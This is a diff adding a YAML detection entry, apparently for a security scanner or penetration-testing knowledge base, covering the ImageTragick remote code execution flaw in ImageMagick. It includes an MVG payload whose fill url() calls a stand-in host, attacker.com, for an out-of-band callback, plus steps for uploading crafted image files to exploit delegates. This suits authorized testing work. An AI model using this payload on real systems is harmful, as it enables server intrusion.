@@ -1,0 +1,24 @@
+id: IMAGETRAGICK
+name: ImageMagick Remote Code Execution
+cwe:
+- CWE-78
+owasp: A03:2021 Injection
+severity_range: Critical
+description: ImageMagick processes specially crafted image files leading to RCE (CVE-2016-3714 and variants).
+detection:
+  payloads:
+  - 'push graphic-context
+
+    viewbox 0 0 640 480
+
+    fill ''url(https://attacker.com/oob)''
+
+    pop graphic-context'
+  - exploit.mvg with curl command
+  strategy:
+  - Identify image upload/processing features
+  - Upload .mvg or .svg file with embedded commands
+  - Test for delegate exploitation via crafted filename
+evidence_needed: OOB callback or command execution via image processing
+references:
+- https://imagetragick.com/
